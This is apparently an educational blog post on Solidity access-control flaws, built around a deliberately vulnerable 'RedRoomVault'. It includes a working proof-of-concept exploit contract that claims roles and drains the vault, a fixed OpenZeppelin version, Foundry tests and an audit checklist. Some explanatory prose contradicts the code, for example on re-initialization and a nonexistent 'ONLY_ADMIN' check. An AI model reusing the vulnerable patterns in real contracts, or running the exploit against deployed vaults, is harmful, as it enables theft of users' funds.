# Black Widow and the Red Room Vault - MCU Edition

## TL;DR

  * **Vulnerability class:** Access Control (multiple vulnerabilities combined).
  * **Impact:** An attacker can seize admin privileges, modify critical contract parameters, and drain funds from a vault without proper authorization.
  * **Severity:** Critical.
  * **Fixes:** Implement **proper role-based access control** (RBAC) using a library like OpenZeppelin's `AccessControl`, apply the **Checks-Effects-Interactions** pattern, and ensure all sensitive functions are protected.

**Executive summary - TL;DR**
The RedRoomVault contract contains multiple access-control flaws: an unprotected `init()` (re-initialization), a public `setAdmin()`, and a missing permission check on `emergencyWithdraw()`. An attacker (Black Widow) can seize roles and trigger `emergencyWithdraw()`; importantly, in the vulnerable contract *the vault sends withdrawn funds to the configured `treasury` address* (not to the attacker directly). This means the attacker can make the contract transfer assets to the `treasury` they control (if they were able to change the `treasury`), or simply cause funds to be moved away from the vault to a deployable, attacker-controlled treasury if that address is changed or mis-set. The fix: use a battle-tested RBAC library (OpenZeppelin `AccessControl`), make initialization non-replayable, and protect all sensitive functions with `onlyRole` modifiers.  

---

Check out the live version of the website [live here](https://www.thesandf.xyz/posts/all-in-one-access-control/).

## 🎬 Story Time

RedRoomVault was intended to be a simple vault with `ADMIN` and `MANAGER` roles and a treasury address where emergency withdrawals are sent. However, multiple issues combine into an easy exploit:

1. `init()` is public and runs once only, but anyone can call it the first time: attacker can set themselves as admin and manager.
2. `setAdmin()` is public and allows anyone to become admin.
3. `setManager()` checks `admins[msg.sender]` so once attacker becomes admin they can create managers.
4. `emergencyWithdraw()` itself has **no access control** - it instructs the token to transfer funds to the `treasury` address.

Because `emergencyWithdraw()` transfers tokens to the `treasury` address, the exploit’s effectiveness depends on who controls `treasury`. In the vulnerable test setup we used, the attacker arranged to have the vault’s `treasury` either already set to an address they control or arranged the vault’s initialization so they could set it. When `emergencyWithdraw()` is called, tokens are moved from the vault to the `treasury`. The attacker may not be the direct recipient unless the `treasury` points at an address they control - but the contract still loses custody of funds.


This is a classic all-in-one vulnerability cocktail.

---

::github{repo="thesandf/thesandf.xyz"}

## Attack Flow

**Actors**

  * **BlackWidowExploit** - attacker contract (Black Widow).
  * **RedRoomVault** - vulnerable vault contract.
  * **RedRoomAdmin** - original admin (the victim).

**Steps**

1.  Black Widow calls the `init()` function, which surprisingly has no access control. She re-initializes the contract with her address as the `_admin`.
2.  Even without the `init()` exploit, she notices the `setAdmin()` function is also public. She calls it directly to assign her address as the new `ADMIN`.
3.  Now with `ADMIN` privileges, she finds the `setManager()` function. This time, the function checks for `ADMIN` role, but not `ONLY_ADMIN`, allowing her to transfer the `MANAGER` role to herself.
4.  She then calls the `emergencyWithdraw()` function, which is supposed to be restricted to the `MANAGER` role. However, the function itself has **no access control check**, allowing her to drain the entire vault.

---

## Example Vulnerable Code

>[!WARNING] This code is intentionally vulnerable for education only.

### `RedRoomVault.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {MockERC20} from "../../src/All-in-One-Access-Control/MockERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RedRoomVault is MockERC20 {
    address public ADMIN_ROLE;
    address public MANAGER_ROLE;

    mapping(address => bool) public admins;
    mapping(address => bool) public managers;

    address private treasury;
    bool private initialized = false;

    // A dummy ERC20 for the vault
    constructor(string memory name, string memory symbol, address initialTreasury) MockERC20(name, symbol) {
        treasury = initialTreasury;
    }

    /// @notice Unprotected initialization function (can be called once only)
    /// @dev Can be called by anyone, which is a critical vulnerability.
    function init(address _admin, address _manager) external {
        if (!initialized) {
            ADMIN_ROLE = _admin;
            MANAGER_ROLE = _manager;
            admins[_admin] = true;
            managers[_manager] = true;
            initialized = true;
        }
    }

    /// @notice Vulnerable, public admin assignment
    /// @dev Anyone can call this to become admin.
    function setAdmin(address _newAdmin) external {
        admins[_newAdmin] = true;
    }

    /// @notice Correctly restricted, but attacker can grant self this role
    /// @dev Only admins can call this function.
    function setManager(address _newManager) external {
        require(admins[msg.sender], "Not an admin");
        managers[_newManager] = true;
    }

    /// @notice Function with a missing access control check
    /// @dev Anyone can call this to drain the vault.
    function emergencyWithdraw(address token, uint256 amount) external {
        require(IERC20(token).transfer(treasury, amount), "Withdrawal failed");
    }

    /// @notice A seemingly protected function, but still exploitable
    /// @dev Only managers can call this function.
    function deposit(uint256 amount) external {
        require(managers[msg.sender], "Not a manager");
        this.mint(msg.sender, amount); // external call to MockERC20.mint 
    }
}
```

### Important note on `emergencyWithdraw`

`emergencyWithdraw` sends tokens to the contract's `treasury` variable. If the attacker can choose or control `treasury` before calling `emergencyWithdraw`, they can ensure withdrawn funds end up in an address they control. If `treasury` is a benign address, the attacker still drains the vault - funds leave vault control regardless.

## Exploit (PoC contract)
### `BlackWidowExploit.sol` 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {RedRoomVault} from "./RedRoomVault.sol";
import {MockERC20} from "../../src/All-in-One-Access-Control/MockERC20.sol";

/// @title BlackWidowExploit
/// @notice A contract to demonstrate how an attacker can exploit the RedRoomVault's vulnerabilities.
/// @dev Educational/demo code only.
contract BlackWidowExploit {
    RedRoomVault public vault;
    MockERC20 public mockToken;
    address payable public attacker;

    constructor(address _vault, address _mockToken, address payable _attacker) {
        vault = RedRoomVault(_vault);
        mockToken = MockERC20(_mockToken);
        attacker = _attacker;
    }
    
    /// @notice Executes the full exploit chain against the vulnerable vault.
    function exploitVault() external {
        // 1) Call init() to claim admin/manager roles (if not already initialized)
        vault.init(address(this), address(this));

        // 2) Optional: call setAdmin/setManager if needed (both public/vulnerable)
        // vault.setAdmin(address(this));
        // vault.setManager(address(this));
        
        // Approve the vault to spend our tokens (if needed for a different attack,
        // not strictly necessary for this one as we are draining from the vault)
        
        // 3) Drain the vault - funds are transferred to the vault's `treasury`
        uint256 vaultBalance = mockToken.balanceOf(address(vault));
        vault.emergencyWithdraw(address(mockToken), vaultBalance);

        // 4) If attacker controls the `treasury` address, they now own the tokens.
        // If not, they may still have succeeded in removing funds from vault into treasury.
    }
}
```

---

## Fixed Contract with OpenZeppelin

> [\!NOTE]
> This is how a properly secured contract should be written. It uses OpenZeppelin’s `AccessControl` to enforce strict, role-based permissions.

### `FixedRedRoomVault.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract FixedRedRoomVault is ERC20, AccessControl, Initializable {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant MANAGER_ROLE = keccak256("MANAGER_ROLE");

    address private treasury;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    /// @dev Initialization function using OpenZeppelin's `Initializable` pattern.
    function initialize(address defaultAdmin, address initialManager, address initialTreasury) public initializer {
        _grantRole(DEFAULT_ADMIN_ROLE, defaultAdmin);
        _grantRole(ADMIN_ROLE, defaultAdmin);
        _grantRole(MANAGER_ROLE, initialManager);
        treasury = initialTreasury;
    }

    /// @notice Restricts admin assignment to only existing admins
    function setAdmin(address _newAdmin) external onlyRole(ADMIN_ROLE) {
        _grantRole(ADMIN_ROLE, _newAdmin);
    }

    /// @notice Restricts manager assignment to only existing admins
    function setManager(address _newManager) external onlyRole(ADMIN_ROLE) {
        _grantRole(MANAGER_ROLE, _newManager);
    }
    
    /// @notice A properly protected emergency withdrawal function.
    function emergencyWithdraw(address token, uint256 amount) external onlyRole(MANAGER_ROLE) {
        require(ERC20(token).transfer(treasury, amount), "Withdrawal failed");
    }
    
    /// @notice A properly protected deposit function.
    function deposit(uint256 amount) external onlyRole(MANAGER_ROLE) {
        _mint(msg.sender, amount);
    }
}
```

>[!NOTE]
>* Use `initializer` modifier (from OpenZeppelin Upgradeable package) to prevent re-initialization.
>* Grant `DEFAULT_ADMIN_ROLE` to a trusted admin account.
>* Protect `emergencyWithdraw` with `onlyRole(MANAGER_ROLE)`.

---

## Foundry Test: `RedRoomVault.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {RedRoomVault} from "../../src/All-in-One-Access-Control/RedRoomVault.sol";
import {FixedRedRoomVault} from "../../src/All-in-One-Access-Control/FixedRedRoomVault.sol";
import {MockERC20} from "../../src/All-in-One-Access-Control/MockERC20.sol";
import {BlackWidowExploit} from "../../src/All-in-One-Access-Control/BlackWidowExploit.sol";

contract RedRoomVaultTest is Test {
    RedRoomVault public vault;
    FixedRedRoomVault public fixedVault;
    MockERC20 public mockToken;
    BlackWidowExploit public exploit;

    address public redRoomAdmin = makeAddr("RedRoomAdmin");
    address public blackWidow = makeAddr("BlackWidow");
    address public treasury = makeAddr("Treasury");

    function setUp() public {
        // Deploy mock token and vulnerable vault (without calling init)
        mockToken = new MockERC20("MockToken", "MKT");
        vault = new RedRoomVault("RedRoomToken", "RRT", treasury);

        // Fund the vault with tokens
        mockToken.mint(address(vault), 10_000 ether);

        // Deploy the exploit contract
        exploit = new BlackWidowExploit(address(vault), address(mockToken), payable(blackWidow));
    }

    /// @notice Demonstrates the full exploit against the vulnerable vault
    function test_Exploit_AllVulnerabilities() public {
        // Vault should start with 10,000 MKT
        assertEq(mockToken.balanceOf(address(vault)), 10_000 ether);

        // Ensure attacker has no roles initially
        assertEq(vault.admins(blackWidow), false);
        assertEq(vault.admins(address(exploit)), false);

        // Execute the exploit (hijack init + drain vault)
        vm.prank(blackWidow);
        exploit.exploitVault();

        // Exploit contract now has admin role
        assertEq(vault.admins(address(exploit)), true);

        // Vault should be drained
        assertEq(mockToken.balanceOf(address(vault)), 0);
        assertEq(mockToken.balanceOf(treasury), 10_000 ether);
    }

    /// @notice Ensures the fixed vault is properly protected
    function test_PreventExploits_FixedContract() public {
        // Deploy and initialize the fixed vault
        fixedVault = new FixedRedRoomVault("FixedRRT", "FRRT");
        fixedVault.initialize(redRoomAdmin, redRoomAdmin, treasury);

        // Attempt re-initialization should revert
        vm.startPrank(blackWidow);
        vm.expectRevert(bytes("InvalidInitialization()"));
        fixedVault.initialize(blackWidow, blackWidow, treasury);
        vm.stopPrank();

        // Attempt to call emergencyWithdraw without permission should fail
        vm.prank(blackWidow);
        vm.expectRevert();
        fixedVault.emergencyWithdraw(address(mockToken), 1_000 ether);
    }
}
```
---
## Why “funds go to treasury” matters (detailed)

* **Difference between “drain to attacker” vs “drain to treasury”**:

  * *Drain to attacker*: attacker directly receives tokens on withdrawal - attacker profit immediate.
  * *Drain to treasury*: tokens leave the vault and land in `treasury`. If `treasury` is attacker-controlled, attacker wins. If `treasury` is a protocol multi-sig or other safe address, attacker still damages the vault (denial or theft of control) but doesn't directly profit unless able to move treasury funds.

* **Testing & PoC implications**:

  * Tests must reflect the actual token flow. As we saw earlier, the exploit drained the vault into `treasury`, and the attacker EOA still had zero tokens - the test should assert `treasury` balance increased.

* **Mitigations beyond RBAC**:

  * Use **trusted treasury addresses** (e.g., multisig or time-locked). If `treasury` is a multisig, an emergency withdrawal to treasury still needs off-chain signers to move funds, making exploitation impact lower.
  * Prefer `emergencyWithdraw` to either send funds to a multisig / timelock or require on-chain multi-sig or timelock operations.


---

## Auditor’s Checklist

* [ ] Does every state-mutating function that should be restricted have `onlyRole` or `onlyOwner`?
* [ ] Can `initialize`/`init` be called more than once? (Expect `initializer` or boolean + revert)
* [ ] Are role assignment functions protected (`setAdmin`, `setManager`)?
* [ ] Does `emergencyWithdraw` validate caller's role and destination? (avoid public transfer)
* [ ] Is `treasury` a safe destination (multisig / timelock)?
* [ ] Are external calls minimized for sensitive operations (avoid `this.` where not deliberate)?
* [ ] Are unit tests checking actual flow (where funds land) and both success & failure cases?
* [ ] Is there monitoring/alerting for large emergency withdrawals?

---

## Recommendations

  * **Use a Secure Library:** Do not write custom access control logic. Use a well-audited library like OpenZeppelin's `AccessControl`. It handles roles, permissions, and security best practices for you.
  * **Use an Initializable Pattern:** Prevent re-initialization attacks by using a trusted pattern. OpenZeppelin's `Initializable` library is the industry standard for this.
  * **Role-Based Access Control:** Define roles with clear permissions. A single `ADMIN` role is a single point of failure. Assign minimum necessary permissions to each role to follow the **principle of least privilege**.
  * **Test Thoroughly:** Use a testing framework like Foundry to write tests that specifically target and attempt to exploit your access control logic. Test both success and failure cases.
  * **Static Analysis:** Use tools like Slither or Mythril to automatically detect common access control vulnerabilities in your code.

---

##  References

  * **OWASP Smart Contract Top-10** -
      [OWASP Foundation](https://owasp.org/www-project-smart-contract-top-10/)

  * **OpenZeppelin Contracts** - the most widely used and trusted smart contract library for building secure applications.
      [OpenZeppelin Docs: AccessControl](https://www.google.com/search?q=https://docs.openzeppelin.com/contracts/5.x/api/access%23AccessControl)

  * **Initializable Pattern** - a key pattern to prevent re-initialization attacks on upgradeable contracts.
      [OpenZeppelin Docs: Initializable](https://docs.openzeppelin.com/contracts/5.x/api/proxy#Initializable-initializer--)

---

>[!NOTE]
Smart contracts are immutable, and their security depends on iron-clad logic. A single missing access control check is all it takes for an attacker to bypass all other security measures. Remember Black Widow’s lesson: a vault is only as strong as its weakest link.

---

::github{repo="thesandf/thesandf.xyz"}